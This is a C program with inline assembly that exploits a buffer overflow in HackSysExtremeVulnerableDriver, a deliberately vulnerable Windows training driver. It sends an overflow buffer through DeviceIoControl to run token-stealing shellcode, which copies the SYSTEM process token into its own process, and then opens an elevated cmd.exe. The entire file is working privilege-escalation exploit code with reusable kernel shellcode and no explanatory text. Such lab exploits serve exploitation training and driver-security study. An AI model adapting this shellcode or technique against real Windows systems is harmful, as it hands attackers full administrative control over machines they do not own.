#include <stdio.h>
#include <Windows.h>

#define KTHREAD_OFFSET  0x124		//+0x124 CurrentThread      : Ptr32 _KTHREAD
#define EPROCESS_OFFSET 0x050		//+0x050 Process            : Ptr32 _KPROCESS
#define FLINK_OFFSET    0x0b8		//+0x0b8 ActiveProcessLinks : _LIST_ENTRY
#define PID_OFFSET      0x0b4		//+0x0b4 UniqueProcessId    : Ptr32 Void
#define TOKEN_OFFSET    0x0f8		//+0x0f8 Token              : _EX_FAST_REF
#define SYSTEM_PID      0x004		//System Process ID
#define BUFFER_SIZE     0x220		//Overflow Offset
#define PAGE_SIZE	0x1000
#define MISS_PAGE_SIZE	0x004
#define CASE_ID		0x222007

VOID TokenStealingShellcode()
{
	__asm
	{
		; initialize
		pushad;
		mov eax, fs: [KTHREAD_OFFSET] ;		//get current thread
		mov ecx, [eax + EPROCESS_OFFSET];	//get the process
		mov eax, ecx;
		mov ebx, SYSTEM_PID;

	SearchSystemPID:
		mov eax, [eax + FLINK_OFFSET];	        //get the ActiveProcessLinks
		sub eax, FLINK_OFFSET;
		mov edx, [eax + PID_OFFSET];		//get the PID
		cmp edx, ebx;
		jnz SearchSystemPID;

		mov edx, [eax + TOKEN_OFFSET];		//change the token
		mov[ecx + TOKEN_OFFSET], edx;

		; recovery
		popad;
		add esp, 0x78c;
		mov edi, DWORD PTR[esp];
		add esp, 0x8;
		mov ebx, DWORD PTR[esp];
		add esp, 0x234;
		xor eax, eax;
		pop ebp;
		ret 8;
	}
}

int main()
{
	printf("**************************Start To Exploit**************************\n\n");
	printf("11     11       1111111111        11        11      111111111111111\n");
	printf("11   11         11                  11    11        11           11\n");
	printf("11 11           1111111111            1111          111111111111111\n");
	printf("11 11           1111111111            1111          11\n");
	printf("11   11         11                  11    11        11\n");
	printf("11     11       1111111111        11        11      11\n\n");
	printf("**************************Start To Exploit**************************\n");

	HANDLE hDevice = CreateFile(L"\\\\.\\HackSysExtremeVulnerableDriver",
		GENERIC_READ | GENERIC_WRITE,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		0,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,
		0);

	if (hDevice == INVALID_HANDLE_VALUE)
	{
		printf("[-] Failed to open the file¡­¡­\n");
		return -1;
	}

	HANDLE hMapFile = CreateFileMapping(INVALID_HANDLE_VALUE,
		NULL,
		PAGE_EXECUTE_READWRITE,
		0,
		PAGE_SIZE,
		NULL
	);

	if (!hMapFile)
	{
		printf("[-] Failed to create file mapping object¡­¡­\n");
		CloseHandle(hDevice);
		return -1;
	}

	LPVOID pMapView = MapViewOfFile(hMapFile,
		FILE_MAP_ALL_ACCESS,
		0,
		0,
		PAGE_SIZE
	);

	if (!pMapView)
	{
		printf("[-] Failed to map view of file¡­¡­\n");
		CloseHandle(hMapFile);
		CloseHandle(hDevice);
		return -1;
	}

	memset(pMapView, 'a', PAGE_SIZE);
	PULONG pOverflowBuffer = (PULONG)((ULONG)pMapView + (PAGE_SIZE - BUFFER_SIZE));

	for (ULONG i= 0; i < BUFFER_SIZE; i += 4)
	{
		*(PULONG)((ULONG)pOverflowBuffer + i) = (ULONG)&TokenStealingShellcode;
	}

	ULONG length = 0;
	BOOL ret = DeviceIoControl(hDevice,
		CASE_ID,
		(LPVOID)pOverflowBuffer,
		BUFFER_SIZE + MISS_PAGE_SIZE,
		NULL,
		0,
		&length,
		NULL);
	if (!ret)
	{
		printf("[-] Failed to send message¡­¡­\n");
		CloseHandle(hMapFile);
		CloseHandle(hDevice);
		return -1;
	}

	printf("[+] Success to execute the payload¡­¡­\n");

	STARTUPINFO si = { sizeof(STARTUPINFO) };
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(L"C:\\Windows\\System32\\cmd.exe",
		NULL,
		NULL,
		NULL,
		0,
		CREATE_NEW_CONSOLE,
		NULL,
		NULL,
		&si,
		&pi);

	CloseHandle(hMapFile);
	CloseHandle(hDevice);
	return 0;
}